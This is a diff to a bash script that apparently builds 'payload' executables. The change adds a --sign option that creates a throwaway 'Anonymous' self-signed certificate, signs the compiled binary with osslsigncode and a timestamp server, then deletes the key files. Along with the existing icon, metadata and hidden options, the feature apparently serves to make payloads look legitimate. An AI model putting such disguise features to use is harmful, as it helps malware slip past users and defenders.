@@ -17,6 +17,7 @@ SOURCE_FILE=""
 ARCH="64"
 USE_HIDDEN=false
 USE_AES=false
+SIGN_PAYLOAD=false
 EXTRA_FILES=()
 
 show_help() {
@@ -60,6 +61,37 @@ check_dependencies() {
 }
 check_dependencies
 
+sign_payload() {
+  if ! command -v osslsigncode &>/dev/null; then
+    echo -e "${YELLOW}${PREFIX} osslsigncode not found. Installing...${NC}"
+    if ! apt-get install -y osslsigncode &>/dev/null; then
+      echo -e "${RED}${PREFIX} Failed to install osslsigncode.${NC}"
+      exit 1
+    fi
+  fi
+
+  echo -e "${BLUE}${PREFIX} Generating anonymous certificate...${NC}"
+  openssl req -new -newkey rsa:2048 -x509 -days 365 -nodes \
+    -subj "/CN=Anonymous/O=Anonymous/C=FR" \
+    -keyout anon_key.pem -out anon_cert.pem &>/dev/null
+
+  openssl pkcs12 -export -out anon_cert.pfx -inkey anon_key.pem -in anon_cert.pem -passout pass: &>/dev/null
+
+  SIGNED_OUTPUT="${OUTPUT%.exe}_signed.exe"
+  echo -e "${BLUE}${PREFIX} Signing executable...${NC}"
+  if osslsigncode sign -pkcs12 anon_cert.pfx -pass "" -n "Anonymous App" -i "https://anonymous.url" \
+      -t "http://timestamp.sectigo.com" -in "$OUTPUT" -out "$SIGNED_OUTPUT" &>/dev/null; then
+    echo -e "${GREEN}${PREFIX} Signed executable created: ${WHITE}${OUTPUT}${NC}"
+    mv "$SIGNED_OUTPUT" "$OUTPUT"
+  else
+    echo -e "${RED}${PREFIX} Signing failed.${NC}"
+    exit 1
+  fi
+
+  echo -e "${BLUE}${PREFIX} Cleaning up signing files...${NC}"
+  rm -f anon_key.pem anon_cert.pem anon_cert.pfx
+}
+
 if [[ ! -d "$ICONS_DIR" || ! -d "$METADATA_DIR" ]]; then
   echo -e "${RED}${PREFIX} Required folders '${ICONS_DIR}' or '${METADATA_DIR}' not found. Exiting.${NC}"
   exit 1
@@ -84,6 +116,10 @@ while [[ $# -gt 0 ]]; do
       ;;
     --aes)
       USE_AES=true
+      shift
+      ;;
+    --sign)
+      SIGN_PAYLOAD=true
       shift
       ;;
     --add-file)
@@ -185,6 +221,9 @@ CMD+=("-o" "$OUTPUT")
 echo -e "${BLUE}${PREFIX} Compiling payload as ${ARCH}-bit ${IS_CPP:+C++} binary...${NC}"
 if "${CMD[@]}"; then
   echo -e "${GREEN}${PREFIX} Compilation successful: ${WHITE}${OUTPUT}${NC}"
+  if $SIGN_PAYLOAD; then
+    sign_payload
+  fi
 else
   echo -e "${RED}${PREFIX} Compilation failed.${NC}"
   exit 1
